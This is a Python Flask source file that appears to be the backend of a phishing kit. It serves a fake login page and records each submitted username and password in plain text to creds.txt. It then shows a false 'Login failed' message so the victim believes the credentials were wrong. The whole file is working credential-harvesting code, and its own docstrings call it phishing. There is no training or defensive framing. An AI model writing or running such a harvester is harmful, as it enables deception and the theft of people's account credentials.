from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

# Define paths relative to this file
BASE_DIR = os.path.dirname(__file__)
TEMPLATE_PATH = os.path.join(BASE_DIR, "../frontend/fake_login.html")
CREDS_FILE = os.path.join(BASE_DIR, "creds.txt")


@app.route("/", methods=["GET"])
def serve_login_page():
    """
    Serve the phishing HTML page (fake_login.html) by reading it from disk.
    """
    try:
        with open(TEMPLATE_PATH, "r", encoding="utf-8") as f:
            html_content = f.read()
        return render_template_string(html_content)
    except FileNotFoundError:
        return "Error: fake_login.html not found. Make sure frontend/fake_login.html exists.", 500


@app.route("/login", methods=["POST"])
def capture_credentials():
    """
    Handle form submission. Extract 'username' and 'password', append them to creds.txt,
    then return a generic 'Login failed' page (status 401) so the user thinks credentials were invalid.
    """
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()

    if username or password:
        log_line = f"{username} : {password}\n"
        try:
            with open(CREDS_FILE, "a", encoding="utf-8") as f:
                f.write(log_line)
        except Exception as e:
            # Print to console if writing fails, but don’t crash the server
            print(f"[ERROR] Could not write to creds.txt: {e}")

    # Return a fake “Login failed” page
    return """
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <title>Login Error</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            background-color: #f4f6f9;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
          }
          .error-box {
            background: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 1px 5px rgba(0, 0, 0, 0.1);
          }
          .error-box h2 {
            color: #d32f2f;
            margin-bottom: 10px;
          }
          .error-box a {
            color: #1976d2;
            text-decoration: none;
          }
          .error-box a:hover {
            text-decoration: underline;
          }
        </style>
      </head>
      <body>
        <div class="error-box">
          <h2>Login Failed</h2>
          <p>The email or password you entered is incorrect.</p>
          <p><a href="/">Back to Login</a></p>
        </div>
      </body>
    </html>
    """, 401


if __name__ == "__main__":
    # To allow external access, uncomment host="0.0.0.0"
    # app.run(host="0.0.0.0", port=5000, debug=True)
    app.run(port=5000, debug=True)
